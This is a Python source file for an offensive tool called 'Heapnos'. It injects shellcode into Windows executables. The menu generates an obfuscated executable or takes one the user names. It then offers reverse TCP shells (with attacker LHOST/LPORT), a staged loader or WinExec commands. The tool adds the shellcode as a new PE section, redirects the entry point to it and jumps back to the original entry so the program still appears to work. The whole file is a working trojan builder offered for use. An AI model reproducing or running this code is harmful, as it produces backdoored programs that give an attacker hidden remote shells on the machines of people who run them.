import os
import sys
from SRC import LibDebug
from SRC import LibObfuscator
from SRC import LibByteEditor
from SRC import LibPeAnnalyzer
from SRC import LibShellcode
from SRC import LibPeEditor

Color = LibDebug.COLORS()


def menu():
    LibDebug.Log(
        "WORK", "This program use NASM, and ld. Please check that there are installed before using it.")
    if LibDebug.CheckEnv() != "win32":
        LibDebug.Log("ERROR", "Only working on windows at the moment..")

    outputfile = LibObfuscator.RandomizedString(7) + ".exe"

    print(
        Color.GREEN + "Welcome to " + Color.RED +
        "Heapnos Menu Version__" + Color.RESET
    )
    value = input("Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ")
    case = ["generate", "edit", "e", "g"]
    if value in case:
        if value == "generate" or value == "g":
            LibDebug.Log("WORK", "Generating executable..")
            try:
                ObfuscatedC = LibObfuscator.ObfuscateC(
                    LibObfuscator.GenerateC(50), 25)
                inputfile = LibObfuscator.Compile(ObfuscatedC)
                os.system("rm *.c")
                LibDebug.Log("SUCCESS", Color.GREEN + inputfile +
                             Color.RESET + " generated..")
            except:
                LibDebug.Log("ERROR", "Generation failed..")
        elif value == "edit" or value == "e":
            LibDebug.Log("WORK", "Generating executable..")
            value = input("Enter the file you want to exploit : ")
            LibDebug.CheckFile(value)
            inputfile = value
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

    HexContent = LibByteEditor.GetHexFromFile(inputfile)
    PeInput = LibPeAnnalyzer.Extract(HexContent)

    print(
        Color.GREEN + "It's time to generate a " + Color.RED + "shellcode" + Color.RESET + "." +
        "\nHere's a list of options :"
    )

    shellcodes = []
    for (dirpath, dirnames, filenames) in os.walk("ASM/ShellCodes"):
        for file in filenames:
            shellcodes.append((dirpath+"/"+file).replace("\\",
                                                         "/").replace("ASM/ShellCodes/", "").split(".")[0])

    case = []
    for i in range(0, len(shellcodes)):
        case += str(i)
        print("     " + Color.GREEN + str(i) +
              Color.RESET + " - " + shellcodes[i])

    value = input("Select one shellcode : ")
    shellcode = LibShellcode.SHELLCODE()
    if value in case:
        LibDebug.Log("SUCCESS", shellcodes[int(
            value)] + " successfuly loaded.")
        LibDebug.Log("WORK", "Generating the shellcode..")
        try:
            if shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Shell":
                LHOST = input("Please enter your " + Color.YELLOW +
                              " LHOST IP " + Color.RESET + " : ")
                LPORT = input("Please enter your " + Color.YELLOW +
                              " LPORT " + Color.RESET + " : ")
                shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
            elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Staged":
                shellcode = LibShellcode.GenerateCDRTS()
            elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
                shellcode = LibShellcode.GenerateCDRTTShell()
            elif shellcodes[int(value)] == "Custom_Dynamic_WinExec":
                CMD = input("Please enter your " + Color.YELLOW +
                            " COMMAND " + Color.RESET + " : ")
                shellcode = LibShellcode.GenerateWinExec(CMD)
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the generation. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

    newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
                      + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
    shellcode = shellcode.GetShellcode()
    shellcode += "B8" + newjump + "FFE0"
    LibDebug.Log("SUCCESS", "Shellcode successfully generated.")

    LibDebug.Log("WORK", "Generating new section..")
    LibPeEditor.AddSection(PeInput, ".mew", shellcode)
    LibDebug.Log("WORK", "Calculating new EntryPoint..")
    LibPeEditor.ModifyEntryPoint(PeInput, PeInput.SectionTable.sections[int(
        PeInput.Coffheader.numberofsections, 16)-1].virtualaddress)

    LibDebug.Log("WORK", "Generating edited executable..")
    LibByteEditor.CreateExeFromPe(outputfile, PeInput)

    value = input("Did you want to verify the new executable ? [ " + Color.YELLOW +
                  "y" + Color.RESET + "/" + Color.YELLOW + "n" + Color.RESET + "] : ")
    case = ["y", "n"]
    if value in case:
        try:
            if value == "y":
                HexContent = LibByteEditor.GetHexFromFile(inputfile)
                PeInput = LibPeAnnalyzer.Extract(HexContent)
                HexContent = LibByteEditor.GetHexFromFile(outputfile)
                PeInput2 = LibPeAnnalyzer.Extract(HexContent)
                LibDebug.ComparePe(PeInput, PeInput2)
                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
            elif value == "n":
                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the Verification. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()


menu()
